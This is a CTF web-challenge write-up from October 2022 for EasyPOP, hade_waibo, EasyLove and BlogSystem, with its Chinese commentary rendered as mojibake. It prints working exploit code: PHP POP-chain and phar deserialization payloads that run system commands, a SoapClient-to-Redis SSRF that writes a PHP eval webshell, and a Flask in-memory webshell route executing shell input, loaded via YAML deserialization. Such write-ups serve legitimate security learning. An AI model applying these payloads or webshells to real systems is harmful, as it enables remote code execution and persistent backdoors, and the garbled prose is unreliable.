# 2022.10

# Web

## EasyPOP

```php
<?php
highlight_file(__FILE__);
error_reporting(0);

class fine
{
    private $cmd;
    private $content;

    public function __construct($cmd, $content)
    {
        $this->cmd = $cmd;
        $this->content = $content;
    }

    public function __invoke()
    {
        call_user_func($this->cmd, $this->content);
    }

    public function __wakeup()
    {
        $this->cmd = "";
        die("Go listen to Jay Chou's secret-code! Really nice");
    }
}

class show
{
    public $ctf;
    public $time = "Two and a half years";

    public function __construct($ctf)
    {
        $this->ctf = $ctf;
    }

    public function __toString()
    {
        return $this->ctf->show();
    }

    public function show(): string
    {
        return $this->ctf . ": Duration of practice: " . $this->time;
    }

}

class sorry
{
    private $name;
    private $password;
    public $hint = "hint is depend on you";
    public $key;

    public function __construct($name, $password)
    {
        $this->name = $name;
        $this->password = $password;
    }

    public function __sleep()
    {
        $this->hint = new secret_code();
    }

    public function __get($name)
    {
        $name = $this->key;
        $name();
    }

    public function __destruct()
    {
        if ($this->password == $this->name) {

            echo $this->hint;
        } else if ($this->name = "jay") {
            secret_code::secret();
        } else {
            echo "This is our code";
        }
    }

    public function getPassword()
    {
        return $this->password;
    }

    public function setPassword($password): void
    {
        $this->password = $password;
    }

}

class secret_code
{
    protected $code;

    public static function secret()
    {
        include_once "hint.php";
        hint();
    }

    public function __call($name, $arguments)
    {
        $num = $name;
        $this->$num();
    }

    private function show()
    {
        return $this->code->secret;
    }
}

if (isset($_GET['pop'])) {
    $a = unserialize($_GET['pop']);
    $a->setPassword(md5(mt_rand()));
} else {
    $a = new show("Ctfer");
    echo $a->show();
}
Ctfer: Duration of practice: Two and a half years
```

fineç±»çš„__invoke()ä¸­æœ‰call_user_func()ï¼Œé‚£ä¹ˆåªéœ€è¦ä»¥å‡½æ•°æ–¹å¼è°ƒç”¨fine()å³å¯ï¼Œä½†æ˜¯éœ€è¦ç»•è¿‡__wakeup()

`sorry::__destruct()`(echoè§¦å‘toString)â†’`show::__toString()`(ä»¤$ctfä¸ºsecret_codeè¿™æ ·ä¼šè°ƒç”¨secret_codeçš„show()å‡½æ•°ï¼Œå‡½æ•°ä¸ºç§æœ‰å±æ€§ï¼Œæ‰€ä»¥éœ€è¦__call()æ¥è°ƒç”¨$this->$num();æ¥è§¦å‘__get())â†’`show::__get()`(__get()ä¸­ç»™nameèµ‹å€¼åˆä»¥å‡½æ•°è°ƒç”¨nameé‚£ä¹ˆåªè¦å°†keyè®¾ç½®ä¸ºfineç±»å°±å¯ä»¥é¡ºåˆ©çš„è°ƒç”¨__invoke())â†’`fine::__invoke()`

 if ($this->password == $this->name) çš„ç»•è¿‡åˆ™æ˜¯é€šè¿‡&æ¥æŒ‡å‘åŒä¸€åœ°å€

$this->name = "jay";
$this->password = &$this->name;

__wakeupçš„ç»•è¿‡ç”¨äº†fast_destruc

[ä»qwb webshell é¢˜æ·±å…¥å¿«é€Ÿææ„ (qq.com)](https://mp.weixin.qq.com/s?__biz=MzIzMTQ4NzE2Ng==&mid=2247487933&idx=1&sn=e57bc3583c1b80f1aa7bd08409cfb82d)

```php
<?php
class fine
{
    private $cmd;
    private $content;
    public function __construct()
    {
        $this->cmd="system";
        $this->content="cat /flag";
    }
}

class show
{
    public $ctf;
    public $time = "Two and a half years";
}

class sorry
{
    private $name;
    private $password;
    public $hint;
    public $key;
    public function __construct()
    {
        $this->name = "jay";
        $this->password = &$this->name;
    }
}

class secret_code
{
    protected $code;
    public function __construct($next)
    {
        $this->code = $next;
    }

    private function show()
    {
        return $this->code->secret;
    }
}
$f = new fine();
$sh = new show();
$so1 = new sorry();
$so2 = new sorry();
$so2->key=$f;
$se1 = new secret_code($so2);
$sh->ctf=$se1;
$so1->hint=$sh;
$payload = serialize($so1);
$payload = str_replace('"key";N;}','"key";N;',$payload);
echo urlencode($payload);
```

## ****hade_waibo****

å­˜åœ¨æ–‡ä»¶è¯»å–

index.php

```php
<!DOCTYPE html>
<html lang="en" class="no-js">
<head>
<meta charset="UTF-8" />
<meta http-equiv="X-UA-Compatible" content="IE=edge"> 
<meta name="viewport" content="width=device-width, initial-scale=1"> 
<title>login</title>
<link rel="stylesheet" type="text/css" href="css/button.css" />
<link rel="stylesheet" type="text/css" href="css/button.min.css" />
<link rel="stylesheet" type="text/css" href="css/input.css" />
	<style>
		body{
			text-align:center;
			margin-left:auto;
			margin-right:auto;
			margin-top:300px;
		}

	</style>
</head>
<body>

<?php
error_reporting(0);
session_start();
include 'class.php';

if(isset($_POST['username']) && $_POST['username']!=''){
	#ä¿®å¤äº†ç™»å½•è¿˜éœ€è¦passwdçš„æ¼æ´
	$user = new User($_POST['username']);
}

if($_SESSION['isLogin']){
	die("<script>alert('Login success!');location.href='file.php'</script>");
}else{
	die('
<form action="index.php" method="post">
	<div class="ui input">
		<input type="text" name="username" placeholder="Give me uname" maxlength="6">
	</div>
<form>');
}
```

class.php

```php

<?php
class User
{
    public $username;
    public function __construct($username){
        $this->username = $username;
        $_SESSION['isLogin'] = True;
        $_SESSION['username'] = $username;
    }
    public function __wakeup(){
        $cklen = strlen($_SESSION["username"]);
        if ($cklen != 0 and $cklen <= 6) {
            $this->username = $_SESSION["username"];
        }
    }
    public function __destruct(){
        if ($this->username == '') {
            session_destroy();
        }
    }
}

class File
{
    #æ›´æ–°é»‘åå•ä¸ºç™½åå•ï¼Œæ›´åŠ çš„å®‰å…¨
    public $white = array("jpg","png");

    public function show($filename){
        echo '<div class="ui action input"><input type="text" id="filename" placeholder="Search..."><button class="ui button" onclick="window.location.href=\'file.php?m=show&filename=\'+document.getElementById(\'filename\').value">Search</button></div><p>';
        if(empty($filename)){die();}
        return '<img src="data:image/png;base64,'.base64_encode(file_get_contents($filename)).'" />';
    }
    public function upload($type){
        $filename = "dasctf".md5(time().$_FILES["file"]["name"]).".$type";
        move_uploaded_file($_FILES["file"]["tmp_name"], "upload/" . $filename);
        return "Upload success! Path: upload/" . $filename;
    }
    public function rmfile(){
        system('rm -rf /var/www/html/upload/*');
    }
    public function check($type){
        if (!in_array($type,$this->white)){
            return false;
        }
        return true;
    }

}

#æ›´æ–°äº†ä¸€ä¸ªæ¶æ„åˆæœ‰è¶£çš„Testç±»
class Test
{
    public $value;

    public function __destruct(){
        chdir('./upload');
        $this->backdoor();
    }
    public function __wakeup(){
        $this->value = "Don't make dream.Wake up plz!";
    }
    public function __toString(){
        $file = substr($_GET['file'],0,3);
        file_put_contents($file, "Hack by $file !");
        return 'Unreachable! :)';
    }
    public function backdoor(){
        if(preg_match('/[A-Za-z0-9?$@]+/', $this->value)){
            $this->value = 'nono~';
        }
        system($this->value);
    }

}
```

file.php

```php
<!DOCTYPE html>
<html lang="en" class="no-js">
<head>
<meta charset="UTF-8" />
<meta http-equiv="X-UA-Compatible" content="IE=edge"> 
<meta name="viewport" content="width=device-width, initial-scale=1"> 
<title>login</title>
<link rel="stylesheet" type="text/css" href="css/button.css" />
<link rel="stylesheet" type="text/css" href="css/button.min.css" />
<link rel="stylesheet" type="text/css" href="css/input.css" />
	<style>
		.show{
			text-align:center;
			margin-left:auto;
			margin-right:auto;
			margin-top:240px;
		}
		.run{
			text-align:right;
			margin-left:auto;
			margin-right:auto;
		}

	</style>
</head>
<body>
	<div class="run">
		<div class="ui animated button" tabindex="0" onclick="window.location.href='file.php?m=logout'">
			<div class="hidden content">
				<font style="vertical-align: inherit;">
					<font style="vertical-align: inherit;">æ¶¦!</font>
				</font>
			</div>
			<div class="visible content">
				<font style="vertical-align: inherit;">
					<font style="vertical-align: inherit;">ğŸƒ</font>
				</font>
			</div>
		</div>
	</div>
	<div class="show">

		
<?php
error_reporting(0);
session_start();
include 'class.php';

if($_SESSION['isLogin'] !== true){
	die("<script>alert('å·ç™»ä¸€ä¸‹è°¢è°¢ã€‚');location.href='index.php'</script>");
}
$form = '
<form action="file.php?m=upload" method="post" enctype="multipart/form-data" >
    <input type="file" name="file">
    <button class="mini ui button" ><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
  æäº¤
</font></font></button>
</form>';

$file = new file();
switch ($_GET['m']) {

	case 'upload':
		if(empty($_FILES)){die($form);}

		$type = end(explode(".", $_FILES['file']['name']));
		if ($file->check($type)) {
			die($file->upload($type));
		}else{
			die('ä½ é£Ÿä¸é£Ÿæ²¹é¥¼ğŸ¤¬');
		}
		break;

	case 'show':
		die($file->show($_GET['filename']));
		break;

	case 'rm':
		$file->rmfile();
		die("å…¨åˆ å¹²å‡€äº†æğŸ˜‹");
		break;

	case 'logout':
		session_destroy();
		die("<script>alert('å·²é€€å‡ºç™»å½•');location.href='index.php'</script>");
		break;

	default:
		echo '<h2>Halo! '.$_SESSION['username'].'</h2>';
		break;
}
?>

<div class="ui animated button" tabindex="0" onclick="window.location.href='file.php?m=upload'">
	<div class="visible content">
		<font style="vertical-align: inherit;">
			<font style="vertical-align: inherit;">æ¥ç‚¹ğŸ˜å›¾</font>
		</font>
	</div>
	<div class="hidden content">
		<font style="vertical-align: inherit;">ğŸ¥µ</font>
		</font>
	</div>
</div>

<div class="ui vertical animated button" tabindex="0" onclick="window.location.href='file.php?m=rm'">
	<div class="hidden content">
		<font style="vertical-align: inherit;">
			<font style="vertical-align: inherit;">é”€æ¯è¯æ®</font>
		</font>
	</div>
	<div class="visible content">
		<font style="vertical-align: inherit;">
			<font style="vertical-align: inherit;">ğŸ§¹</font>
		</font>
    </div>
</div>

<div class="ui animated fade button" tabindex="0" onclick="window.location.href='file.php?m=show'">
	<div class="visible content">
		<font style="vertical-align: inherit;">
			<font style="vertical-align: inherit;">cancan need</font>
		</font>
	</div>
	<div class="hidden content">
		<font style="vertical-align: inherit;">
			<font style="vertical-align: inherit;">ğŸ‘€</font>
		</font>
	</div>
</div>
			<script src="js/package.js"></script>
		</div>
	</body>
</html>
```

åˆ«çš„åœ°æ–¹æ²¡å•¥æˆè€ƒè™‘åœ¨Test::backdoor()ä¸­ç»•è¿‡preg_match()æ‰§è¡Œsystem()

phar

```php
<?php
class User
{
public $username;
}

class Test
{
public $value;
}
$User = new User();
$Test = new Test();
$User->a = $Test;
$Test->value = &$User->username;
echo serialize($User);

$phar = new Phar("wuwu.phar"); //åç¼€åå¿…é¡»ä¸ºphar
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER(); ?>"); //è®¾ç½®stub
$phar->setMetadata($User); //å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest
$phar->addFromString("test.txt", "test"); //æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶
//ç­¾åè‡ªåŠ¨è®¡ç®—
$phar->stopBuffering();

?>
```

![Untitled](2022%2010%20f79aee6802f547c79ea9502a77e9850d/Untitled.png)

åŒæ—¶ä¸Šä¼ ä¸€ä¸ªjpg

```
#/bin/sh
ls /
```

åœ¨ç”¨æˆ·åä¸º. ./*çš„æƒ…å†µä¸‹å°†testçš„valueå€¼æŒ‡å‘usernameé‚£ä¹ˆåœ¨show()çš„æ—¶å€™ï¼Œå°†pharååºåˆ—åŒ–

å®˜æ–¹wpä¸ºä¼ å…¥ä¸€ä¸ªåå­—ä¸ºcatçš„æ–‡æ¡£ä»¥ * /*ä¸ºç”¨æˆ·å*ä¸ºcatï¼Œå¯¹æ–‡ä»¶å¤¹ä¸‹å†…å®¹è¦æ±‚ä¸¥è‹›

## ****EasyLove****

```php
<?php
highlight_file(__FILE__);
error_reporting(0);
class swpu{
    public $wllm;
    public $arsenetang;
    public $l61q4cheng;
    public $love;
    
    public function __construct($wllm,$arsenetang,$l61q4cheng,$love){
        $this->wllm = $wllm;
        $this->arsenetang = $arsenetang;
        $this->l61q4cheng = $l61q4cheng;
        $this->love = $love;
    }
    public function newnewnew(){
        $this->love = new $this->wllm($this->arsenetang,$this->l61q4cheng);
    }

    public function flag(){
        $this->love->getflag();
    }
    
    public function __destruct(){
        $this->newnewnew();
        $this->flag();
    }
}
class hint{
    public $hint;
    public function __destruct(){
        echo file_get_contents($this-> hint.'hint.php');
    }
}
$hello = $_GET['hello'];
$world = unserialize($hello);
```

æ‹¿åˆ°hintå

```php
<?php
$hint = "My favorite database is Redis and My favorite day is 20220311";
?>
```

è¯´æ˜äº†redisçš„å¯†ç 

expï¼š

```php
<?php
/*
class hint
{
	public $hint='php://filter/read=convert.base64-encode/resource=/var/www/html/';
}

$a = new hint();
echo(serialize($a));
*/
class swpu{
    public $wllm;
    public $arsenetang;
    public $l61q4cheng;
    public $love;
    public function __construct(){
    
    	$this->wllm = 'SoapClient';
    	$this->l61q4cheng = array(
    		'user_agent'=>"\r\nAUTH 20220311\r\nCONFIG SET dir /var/www/html\r\nSET x '<?@eval(\$_POST[1]);?>'\r\nCONFIG SET dbfilename cmd.php\r\nSAVE",
    		'uri'=>'bbb', 
    		'location'=>'http://127.0.0.1:6379'
    	);

    }

}
echo urlencode(serialize(new swpu()));
```

![Untitled](2022%2010%20f79aee6802f547c79ea9502a77e9850d/Untitled%201.png)

## ****BlogSystem****

æ³¨å†Œè´¦å·ç™»å½•åå‘ç°blogä¸­æœ‰ä¿¡æ¯æ³„éœ²ï¼Œæ³„éœ²äº†å¯†é’¥ `7his_1s_my_fav0rite_ke7`

![Untitled](2022%2010%20f79aee6802f547c79ea9502a77e9850d/Untitled%202.png)

flaskä¼ªé€ session

![Untitled](2022%2010%20f79aee6802f547c79ea9502a77e9850d/Untitled%203.png)

ç›®å½•ç©¿è¶Š

![Untitled](2022%2010%20f79aee6802f547c79ea9502a77e9850d/Untitled%204.png)

è¯»å–æºç ï¼Œä¸ºMVTæ¶æ„ï¼Œviewä¸­çš„å¯¼å…¥åŒ…ä¸º

![Untitled](2022%2010%20f79aee6802f547c79ea9502a77e9850d/Untitled%205.png)

è¯»åˆ°çš„å…³é”®æºç 

index.php

```python
from flask import Blueprint, session, render_template, request, flash, redirect, url_for, Response, send_file
from werkzeug.security import check_password_hash
from decorators import login_limit, admin_limit
from model import *
import os

index = Blueprint("index", __name__)

@index.route('/')
def hello():
    return render_template('index.html')

@index.route('/register', methods=['POST', 'GET'])
def register():
    if request.method == 'GET':
        return render_template('register.html')
    if request.method == 'POST':
        name = request.form.get('name')
        username = request.form.get('username')
        password = request.form.get('password')
        user = User.query.filter(User.username == username).first()
        if user is not None:
            flash("è¯¥ç”¨æˆ·åå·²å­˜åœ¨")
            return render_template('register.html')
        else:
            user = User(username=username, name=name)
            user.password_hash(password)
            db.session.add(user)
            db.session.commit()
            flash("æ³¨å†ŒæˆåŠŸï¼")
            return render_template('register.html')

@index.route('/login', methods=['POST', 'GET'])
def login():
    if request.method == 'GET':
        return render_template('login.html')
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        user = User.query.filter(User.username == username).first()
        if (user is not None) and (check_password_hash(user.password, password)):
            session['username'] = user.username
            session.permanent = True
            return redirect(url_for('index.hello'))
        else:
            flash("è´¦å·æˆ–å¯†ç é”™è¯¯")
            return render_template('login.html')

@index.route("/updatePwd", methods=['POST', 'GET'])
@login_limit
def update():
    if request.method == "GET":
        return render_template("updatePwd.html")
    if request.method == 'POST':
        lodPwd = request.form.get("lodPwd")
        newPwd1 = request.form.get("newPwd1")
        newPwd2 = request.form.get("newPwd2")
        username = session.get("username")
        user = User.query.filter(User.username == username).first()
        if check_password_hash(user.password, lodPwd):
            if newPwd1 != newPwd2:
                flash("ä¸¤æ¬¡æ–°å¯†ç ä¸ä¸€è‡´ï¼")
                return render_template("updatePwd.html")
            else:
                user.password_hash(newPwd2)
                db.session.commit()
                flash("ä¿®æ”¹æˆåŠŸï¼")
                return render_template("updatePwd.html")
        else:
            flash("åŸå¯†ç é”™è¯¯ï¼")
            return render_template("updatePwd.html")

@index.route('/download', methods=['GET'])
@admin_limit
def download():
    if request.args.get('path'):
        path = request.args.get('path').replace('..', '').replace('//', '')
        path = os.path.join('static/upload/', path)
        if os.path.exists(path):
            return send_file(path)
        else:
            return render_template('404.html', file=path)
    return render_template('sayings.html',
                           yaml='æ‰€è°“ã€æ¶ã€ï¼Œæ˜¯é‚£äº›åªä¸ºäº†è‡ªå·±ï¼Œåˆ©ç”¨å’Œè·µè¸å¼±è€…çš„å®¶ä¼™ï¼ä½†æ˜¯ï¼Œæˆ‘è™½ç„¶æ˜¯è¿™æ ·ï¼Œä¹ŸçŸ¥é“ä»€ä¹ˆæ˜¯ä»¤äººä½œå‘•çš„ã€æ¶ã€ï¼Œæ‰€ä»¥ï¼Œç”±æˆ‘æ¥åˆ¶è£ï¼')

@index.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('index.hello'))
```

blog.py

```python
import os
import random
import re
import time

import yaml
from flask import Blueprint, render_template, request, session
from yaml import Loader

from decorators import login_limit, admin_limit
from model import *

blog = Blueprint("blog", __name__, url_prefix="/blog")

def waf(data):
    if re.search(r'apply|process|eval|os|tuple|popen|frozenset|bytes|type|staticmethod|\(|\)', str(data), re.M | re.I):
        return False
    else:
        return True

@blog.route('/writeBlog', methods=['POST', 'GET'])
@login_limit
def writeblog():
    if request.method == 'GET':
        return render_template('writeBlog.html')
    if request.method == 'POST':
        title = request.form.get("title")
        text = request.form.get("text")
        username = session.get('username')
        create_time = time.strftime("%Y-%m-%d %H:%M:%S")
        user = User.query.filter(User.username == username).first()
        blog = Blog(title=title, text=text, create_time=create_time, user_id=user.id)
        db.session.add(blog)
        db.session.commit()
        blog = Blog.query.filter(Blog.create_time == create_time).first()
        return render_template('blogSuccess.html', title=title, id=blog.id)

@blog.route('/imgUpload', methods=['POST'])
@login_limit
def imgUpload():
    try:
        file = request.files.get('editormd-image-file')
        fileName = file.filename.replace('..','')
        filePath = os.path.join("static/upload/", fileName)
        file.save(filePath)
        return {
            'success': 1,
            'message': 'ä¸Šä¼ æˆåŠŸ!',
            'url': "/" + filePath
        }
    except Exception as e:
        return {
            'success': 0,
            'message': 'ä¸Šä¼ å¤±è´¥'
        }

@blog.route('/showBlog/<id>')
def showBlog(id):
    blog = Blog.query.filter(Blog.id == id).first()
    comment = Comment.query.filter(Comment.blog_id == blog.id)
    return render_template("showBlog.html", blog=blog, comment=comment)

@blog.route("/blogAll")
def blogAll():
    blogList = Blog.query.order_by(Blog.create_time.desc()).all()
    return render_template('blogAll.html', blogList=blogList)

@blog.route("/update/<id>", methods=['POST', 'GET'])
@login_limit
def update(id):
    if request.method == 'GET':
        blog = Blog.query.filter(Blog.id == id).first()
        return render_template('updateBlog.html', blog=blog)
    if request.method == 'POST':
        id = request.form.get("id")
        title = request.form.get("title")
        text = request.form.get("text")
        blog = Blog.query.filter(Blog.id == id).first()
        blog.title = title
        blog.text = text
        db.session.commit()
        return render_template('blogSuccess.html', title=title, id=id)

@blog.route("/delete/<id>")
@login_limit
def delete(id):
    blog = Blog.query.filter(Blog.id == id).first()
    db.session.delete(blog)
    db.session.commit()
    return {
        'state': True,
        'msg': "åˆ é™¤æˆåŠŸï¼"
    }

@blog.route("/myBlog")
@login_limit
def myBlog():
    username = session.get('username')
    user = User.query.filter(User.username == username).first()
    blogList = Blog.query.filter(Blog.user_id == user.id).order_by(Blog.create_time.desc()).all()
    return render_template("myBlog.html", blogList=blogList)

@blog.route("/comment", methods=['POST'])
@login_limit
def comment():
    text = request.values.get('text')
    blogId = request.values.get('blogId')
    username = session.get('username')
    create_time = time.strftime("%Y-%m-%d %H:%M:%S")
    user = User.query.filter(User.username == username).first()
    comment = Comment(text=text, create_time=create_time, blog_id=blogId, user_id=user.id)
    db.session.add(comment)
    db.session.commit()
    return {
        'success': True,
        'message': 'è¯„è®ºæˆåŠŸï¼',
    }

@blog.route('/myComment')
@login_limit
def myComment():
    username = session.get('username')
    user = User.query.filter(User.username == username).first()
    commentList = Comment.query.filter(Comment.user_id == user.id).order_by(Comment.create_time.desc()).all()
    return render_template("myComment.html", commentList=commentList)

@blog.route('/deleteCom/<id>')
def deleteCom(id):
    com = Comment.query.filter(Comment.id == id).first()
    db.session.delete(com)
    db.session.commit()
    return {
        'state': True,
        'msg': "åˆ é™¤æˆåŠŸï¼"
    }

@blog.route('/saying', methods=['GET'])
@admin_limit
def Saying():
    if request.args.get('path'):
        file = request.args.get('path').replace('../', 'hack').replace('..\\', 'hack')
        try:
            with open(file, 'rb') as f:
                f = f.read()
                if waf(f):
                    print(yaml.load(f, Loader=Loader))
                    return render_template('sayings.html', yaml='é²è¿…è¯´ï¼šå½“ä½ çœ‹åˆ°è¿™å¥è¯æ—¶ï¼Œè¿˜æ²¡æœ‰æ‹¿åˆ°flagï¼Œé‚£å°±èµ¶ç´§é‡å¼€ç¯å¢ƒå§')
                else:
                    return render_template('sayings.html', yaml='é²è¿…è¯´ï¼šä½ è¯´å¾—ä¸å¯¹')
        except Exception as e:
            return render_template('sayings.html', yaml='é²è¿…è¯´ï¼š'+str(e))
    else:

        with open('view/jojo.yaml', 'r', encoding='utf-8') as f:
            sayings = yaml.load(f, Loader=Loader)
            saying = random.choice(sayings)
            return render_template('sayings.html', yaml=saying)
```

???å¯¹ç›®å½•ç©¿è¶Šæœ‰é™åˆ¶ï¼Œåº”è¯¥ç”¨.//./æ¥ä»£æ›¿../ä½†æ˜¯å¾ˆå¥‡æ€ªå¹¶æ²¡æœ‰å½±å“

å†sayingè·¯ç”±ä¸­ç”¨åˆ°äº†yaml.load(f, Loader=Loader)

![Untitled](2022%2010%20f79aee6802f547c79ea9502a77e9850d/Untitled%206.png)

yamlååºåˆ—åŒ–ï¼ŒèŠå£«waf

```python
def waf(data):
    if re.search(r'apply|process|eval|os|tuple|popen|frozenset|bytes|type|staticmethod|\(|\)', str(data), re.M | re.I):
        return False
    else:
        return True
```

> payload = '!!python/object/apply
payload = '!!python/object/new
> 

bançš„å·®ä¸å¤šäº†æ²¡æˆï¼Œç›´æ¥åˆ©ç”¨ä¸Šä¼ æ³¨å…¥å†…å­˜é©¬ï¼Œ__init__.pyå°†æ•´ä¸ªuploadè§†ä¸ºä¸€ä¸ªè½¯ä»¶åŒ…ï¼Œç„¶ååˆ©ç”¨yamlå°†å…¶åŠ è½½åˆ°å†…å­˜ä¸­

```python
from flask import *
eval(
	"app.add_url_rule('/shell','shell',lambda:__import__('os').popen(_request_ctx_stack.top.request.args.get('shel')).read())",
	{
	'_request_ctx_stack':url_for.__globals__['_request_ctx_stack'],
	'app':url_for.__globals__['current_app']
	})
```

> !!python/module:static.upload
> 

ç”¨è‡ªå·±çš„æäº¤åœ¨burpé‡Œé¢æ”¹æ”¹name

![Untitled](2022%2010%20f79aee6802f547c79ea9502a77e9850d/Untitled%207.png)

åœ¨sayingé‡Œé¢è®¿é—®ä¸Šä¼ çš„yamlï¼Œç”Ÿæˆè·¯ç”±ä¹‹åè®¿é—®å³å¯

![Untitled](2022%2010%20f79aee6802f547c79ea9502a77e9850d/Untitled%208.png)

![Untitled](2022%2010%20f79aee6802f547c79ea9502a77e9850d/Untitled%209.png)